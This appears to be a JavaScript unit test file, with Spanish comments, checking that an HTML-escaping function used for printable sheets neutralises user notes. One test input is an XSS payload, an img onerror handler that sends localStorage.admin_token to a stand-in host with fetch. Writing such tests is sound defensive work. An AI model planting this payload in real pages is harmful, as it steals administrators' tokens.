// Tests del escape de las hojas de impresión. Correr con: npm test (en frontend)
import { test } from "node:test";
import assert from "node:assert/strict";
import { escapeHtml } from "./escapeHtml.js";

test("una nota con código queda como texto", () => {
  assert.equal(
    escapeHtml(`<img src=x onerror="fetch('//x?t='+localStorage.admin_token)">`),
    "&lt;img src=x onerror=&quot;fetch(&#39;//x?t=&#39;+localStorage.admin_token)&quot;&gt;"
  );
});

test("texto normal, números y vacíos", () => {
  assert.equal(escapeHtml("Juan Pérez & Cía."), "Juan Pérez &amp; Cía.");
  assert.equal(escapeHtml(12), "12");
  assert.equal(escapeHtml(null), "");
  assert.equal(escapeHtml(undefined), "");
});
